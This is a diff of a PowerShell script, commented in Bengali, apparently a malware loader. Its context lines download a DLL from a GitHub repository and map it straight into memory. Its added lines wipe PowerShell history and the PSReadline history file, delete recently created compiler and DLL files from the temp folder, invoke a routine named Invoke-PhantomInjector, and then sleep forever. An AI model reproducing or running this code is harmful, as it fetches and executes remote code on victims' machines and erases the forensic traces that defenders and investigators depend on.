@@ -126,24 +126,54 @@ try {
 $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
 [NativeLoader]::Map($bytes, $true)
 
-Invoke-Finalize
 
 $bytes = $null
 $plainCSharp = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
 
-Clear-History
-$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
+# ৮.২ – PowerShell সেশন হিস্ট্রি ক্লিয়ার (মেমোরি)
+Clear-History -Force
+
+# ৮.৩ – হিস্ট্রি ফাইল খালি করো (ফাইল থাকবে, কন্টেন্ট যাবে)
+$historyPath = [System.IO.Path]::Combine(
+    $env:APPDATA,
+    'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt'
+)
 if (Test-Path $historyPath) {
-    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
-}
-
-
-
-$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
-if (-not (Test-Path $historyPath)) {
-    New-Item -Path $historyPath -ItemType File -Force | Out-Null
+    Set-Content -Path $historyPath -Value $null -Force -ErrorAction SilentlyContinue
 } else {
-    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
+    New-Item -Path $historyPath -ItemType File -Force | Out-Null
 }
 
+Clear-History -Force
+$hp = (Get-PSReadlineOption).HistorySavePath
+if (Test-Path $hp) {
+    try {
+        # ফাইলটি খোলা থাকলে রিলিজ করার চেষ্টা
+        [System.GC]::Collect()
+        [System.GC]::WaitForPendingFinalizers()
+        Clear-Content -Path $hp -Force -ErrorAction SilentlyContinue
+        # ফাইলটি খালি কন্টেন্ট দিয়ে ওভাররাইট
+        Set-Content -Path $hp -Value $null -Force -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+# টেম্প ফাইল ক্লিয়ার (গত ২ মিনিটের মধ্যে ক্রিয়েটেড)
+Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+
+# ভেরিয়েবল ক্লিয়ার
+$bytes = $null; $kernel = $null; $type = $null
+[GC]::Collect(); [GC]::WaitForPendingFinalizers()
+
+Invoke-Finalize
+
+Remove-Variable -Name historyPath, tempFiles, ext -ErrorAction SilentlyContinue
+
+if ($PSBoundParameters.Count -gt 0 -or $EncodedDllUrl -or $DllPath) {
+    Invoke-PhantomInjector @PSBoundParameters
+}
+
+ while ($true) { Start-Sleep -Seconds 86400 }
